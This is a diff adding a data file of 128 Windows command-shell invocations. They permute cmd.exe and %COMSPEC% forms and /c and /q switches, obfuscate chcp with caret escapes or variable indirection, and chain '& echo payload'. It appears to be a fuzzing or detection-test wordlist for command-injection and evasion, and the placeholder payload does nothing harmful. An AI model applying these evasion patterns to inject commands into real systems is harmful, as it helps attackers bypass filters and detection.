@@ -1,0 +1,128 @@
+%COMSPEC% "/c" ''/q'' "chcp" 65001 > nul & echo payload
+%COMSPEC% "/c" ''/q'' c^hcp 65001 > nul & echo payload
+%COMSPEC% "/c" ''/q'' chcp 65001 > nul & echo payload
+%COMSPEC% "/c" ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% "/c" /q "chcp" 65001 > nul & echo payload
+%COMSPEC% "/c" /q c^hcp 65001 > nul & echo payload
+%COMSPEC% "/c" /q chcp 65001 > nul & echo payload
+%COMSPEC% "/c" /q set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% ''/q'' "/c" "chcp" 65001 > nul & echo payload
+%COMSPEC% ''/q'' "/c" c^hcp 65001 > nul & echo payload
+%COMSPEC% ''/q'' "/c" chcp 65001 > nul & echo payload
+%COMSPEC% ''/q'' "/c" set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% ''/q'' /c "chcp" 65001 > nul & echo payload
+%COMSPEC% ''/q'' /c c^hcp 65001 > nul & echo payload
+%COMSPEC% ''/q'' /c chcp 65001 > nul & echo payload
+%COMSPEC% ''/q'' /c set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% /c ''/q'' "chcp" 65001 > nul & echo payload
+%COMSPEC% /c ''/q'' c^hcp 65001 > nul & echo payload
+%COMSPEC% /c ''/q'' chcp 65001 > nul & echo payload
+%COMSPEC% /c ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% /c /q "chcp" 65001 > nul & echo payload
+%COMSPEC% /c /q c^hcp 65001 > nul & echo payload
+%COMSPEC% /c /q chcp 65001 > nul & echo payload
+%COMSPEC% /c /q set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% /q "/c" "chcp" 65001 > nul & echo payload
+%COMSPEC% /q "/c" c^hcp 65001 > nul & echo payload
+%COMSPEC% /q "/c" chcp 65001 > nul & echo payload
+%COMSPEC% /q "/c" set a=chcp & call %a% 65001 > nul & echo payload
+%COMSPEC% /q /c "chcp" 65001 > nul & echo payload
+%COMSPEC% /q /c c^hcp 65001 > nul & echo payload
+%COMSPEC% /q /c chcp 65001 > nul & echo payload
+%COMSPEC% /q /c set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" ''/q'' "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" ''/q'' c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" ''/q'' chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" /q "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" /q c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" /q chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe "/c" /q set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' "/c" "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' "/c" c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' "/c" chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' "/c" set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' /c "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' /c c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' /c chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe ''/q'' /c set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c ''/q'' "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c ''/q'' c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c ''/q'' chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c /q "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c /q c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c /q chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /c /q set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q "/c" "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q "/c" c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q "/c" chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q "/c" set a=chcp & call %a% 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q /c "chcp" 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q /c c^hcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q /c chcp 65001 > nul & echo payload
+%windir%\system32\cmd.exe /q /c set a=chcp & call %a% 65001 > nul & echo payload
+cmd "/c" ''/q'' "chcp" 65001 > nul & echo payload
+cmd "/c" ''/q'' c^hcp 65001 > nul & echo payload
+cmd "/c" ''/q'' chcp 65001 > nul & echo payload
+cmd "/c" ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+cmd "/c" /q "chcp" 65001 > nul & echo payload
+cmd "/c" /q c^hcp 65001 > nul & echo payload
+cmd "/c" /q chcp 65001 > nul & echo payload
+cmd "/c" /q set a=chcp & call %a% 65001 > nul & echo payload
+cmd ''/q'' "/c" "chcp" 65001 > nul & echo payload
+cmd ''/q'' "/c" c^hcp 65001 > nul & echo payload
+cmd ''/q'' "/c" chcp 65001 > nul & echo payload
+cmd ''/q'' "/c" set a=chcp & call %a% 65001 > nul & echo payload
+cmd ''/q'' /c "chcp" 65001 > nul & echo payload
+cmd ''/q'' /c c^hcp 65001 > nul & echo payload
+cmd ''/q'' /c chcp 65001 > nul & echo payload
+cmd ''/q'' /c set a=chcp & call %a% 65001 > nul & echo payload
+cmd /c ''/q'' "chcp" 65001 > nul & echo payload
+cmd /c ''/q'' c^hcp 65001 > nul & echo payload
+cmd /c ''/q'' chcp 65001 > nul & echo payload
+cmd /c ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+cmd /c /q "chcp" 65001 > nul & echo payload
+cmd /c /q c^hcp 65001 > nul & echo payload
+cmd /c /q chcp 65001 > nul & echo payload
+cmd /c /q set a=chcp & call %a% 65001 > nul & echo payload
+cmd /q "/c" "chcp" 65001 > nul & echo payload
+cmd /q "/c" c^hcp 65001 > nul & echo payload
+cmd /q "/c" chcp 65001 > nul & echo payload
+cmd /q "/c" set a=chcp & call %a% 65001 > nul & echo payload
+cmd /q /c "chcp" 65001 > nul & echo payload
+cmd /q /c c^hcp 65001 > nul & echo payload
+cmd /q /c chcp 65001 > nul & echo payload
+cmd /q /c set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe "/c" ''/q'' "chcp" 65001 > nul & echo payload
+cmd.exe "/c" ''/q'' c^hcp 65001 > nul & echo payload
+cmd.exe "/c" ''/q'' chcp 65001 > nul & echo payload
+cmd.exe "/c" ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe "/c" /q "chcp" 65001 > nul & echo payload
+cmd.exe "/c" /q c^hcp 65001 > nul & echo payload
+cmd.exe "/c" /q chcp 65001 > nul & echo payload
+cmd.exe "/c" /q set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe ''/q'' "/c" "chcp" 65001 > nul & echo payload
+cmd.exe ''/q'' "/c" c^hcp 65001 > nul & echo payload
+cmd.exe ''/q'' "/c" chcp 65001 > nul & echo payload
+cmd.exe ''/q'' "/c" set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe ''/q'' /c "chcp" 65001 > nul & echo payload
+cmd.exe ''/q'' /c c^hcp 65001 > nul & echo payload
+cmd.exe ''/q'' /c chcp 65001 > nul & echo payload
+cmd.exe ''/q'' /c set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe /c ''/q'' "chcp" 65001 > nul & echo payload
+cmd.exe /c ''/q'' c^hcp 65001 > nul & echo payload
+cmd.exe /c ''/q'' chcp 65001 > nul & echo payload
+cmd.exe /c ''/q'' set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe /c /q "chcp" 65001 > nul & echo payload
+cmd.exe /c /q c^hcp 65001 > nul & echo payload
+cmd.exe /c /q chcp 65001 > nul & echo payload
+cmd.exe /c /q set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe /q "/c" "chcp" 65001 > nul & echo payload
+cmd.exe /q "/c" c^hcp 65001 > nul & echo payload
+cmd.exe /q "/c" chcp 65001 > nul & echo payload
+cmd.exe /q "/c" set a=chcp & call %a% 65001 > nul & echo payload
+cmd.exe /q /c "chcp" 65001 > nul & echo payload
+cmd.exe /q /c c^hcp 65001 > nul & echo payload
+cmd.exe /q /c chcp 65001 > nul & echo payload
+cmd.exe /q /c set a=chcp & call %a% 65001 > nul & echo payload
